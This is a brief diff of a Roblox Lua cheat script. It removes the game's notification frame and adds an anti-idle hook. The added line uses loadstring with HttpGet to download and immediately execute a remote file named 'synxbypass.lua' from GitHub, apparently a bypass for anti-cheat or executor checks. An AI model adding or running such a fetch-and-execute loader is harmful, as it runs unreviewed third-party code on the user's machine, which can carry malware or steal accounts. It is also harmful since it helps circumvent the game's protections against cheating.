@@ -1,4 +1,5 @@
 game:WaitForChild("CoreGui").RobloxGui:WaitForChild("NotificationFrame"):Destroy()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/synxbypass.lua"))()
 repeat wait() until game:IsLoaded()
 local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
